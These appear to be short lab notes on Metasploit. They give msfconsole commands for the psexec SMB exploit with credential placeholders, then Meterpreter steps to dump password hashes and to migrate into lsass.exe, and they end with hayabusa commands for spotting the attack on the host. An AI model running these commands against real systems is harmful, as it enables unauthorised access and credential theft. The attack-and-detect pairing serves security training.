# Metasploit Framework Notes

```
msfconsole -q
show exploits
search type:expliot psexec
info exploit/windows/smb/psexec
use exploit/windows/smb/psexec
set PAYLOAD
show options
set RHOSTS <IP>
set SMBUser <user>
set SMBPASS <pass>
set LHOST <IP>
show options
exploit
```

session management

```
background
sessions
sessions 1
sysinfo
execute -if systeminfo
getuid
ps
getpid
```

dumping hashes with msf

```
hashdump
```

process migration

```
getpid
ps
migrate -N vmtoolsd.exe
sysinfo
getpid
```

process migration for privesc

```
migrate -N lsass.exe
hashdump
```

analyzing this on the host with hayabusa

```
.\hayabusa csv-timeline -o metasploit-psexec.csv -l
Import-Csv -Path .\metasploit-psexec.csv | Where-Object -Property Level -Cin "crit","high" | Select-Object Timestamp,Level,RuleTitle
```
